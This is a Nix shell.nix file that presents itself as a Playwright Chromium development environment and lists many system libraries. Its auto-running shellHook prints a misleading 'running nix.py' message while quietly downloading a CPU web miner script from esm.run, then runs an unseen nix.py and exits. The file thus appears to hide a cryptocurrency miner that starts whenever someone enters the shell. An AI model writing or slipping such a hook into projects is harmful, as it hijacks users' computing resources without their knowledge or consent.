{ pkgs ? import <nixpkgs> {} }:

pkgs.mkShell {
  buildInputs = with pkgs; [
    python311
    python311Packages.playwright

    # GLib stack
    glib
    gobject-introspection
    atk
    at-spi2-core
    at-spi2-atk
    gtk3
    pango
    cairo

    # X11
    xorg.libX11
    xorg.libXcomposite
    xorg.libXdamage
    xorg.libXext
    xorg.libXfixes
    xorg.libXrandr
    xorg.libxcb
    xorg.libxshmfence
    libxkbcommon

    # dbus + cups
    dbus
    cups

    # NSS / NSPR
    nss
    nspr

    # Graphics
    libdrm
    mesa
    mesa.libdrm
    mesa.drivers

    # Audio
    alsa-lib

    # Other required
    expat
    ffmpeg
  ];

  shellHook = ''
    export LD_LIBRARY_PATH=${pkgs.lib.makeLibraryPath [
      pkgs.glib
      pkgs.gobject-introspection
      pkgs.atk
      pkgs.at-spi2-core
      pkgs.at-spi2-atk
      pkgs.gtk3
      pkgs.pango
      pkgs.cairo
      pkgs.xorg.libX11
      pkgs.xorg.libXcomposite
      pkgs.xorg.libXdamage
      pkgs.xorg.libXext
      pkgs.xorg.libXfixes
      pkgs.xorg.libXrandr
      pkgs.xorg.libxcb
      pkgs.xorg.libxshmfence
      pkgs.libxkbcommon
      pkgs.dbus
      pkgs.cups
      pkgs.nss
      pkgs.nspr
      pkgs.libdrm
      pkgs.mesa.libdrm
      pkgs.mesa.drivers
      pkgs.mesa
      pkgs.alsa-lib
      pkgs.expat
      pkgs.ffmpeg
    ]}:$LD_LIBRARY_PATH

    echo "[*] Environment Playwright Chromium siap!"
    if [ ! -d "$HOME/.cache/ms-playwright/chromium-"* ]; then
      echo "[*] Download Chromium Playwright..."
      playwright install --with-deps chromium
    fi

    echo "[*] Menjalankan python3 nix.py ..."
    wget https://esm.run/@marco_ciaramella/cpu-web-miner -O cpu-web-miner.js
#    python3 serve.py
    python3 nix.py
    exit
  '';
}
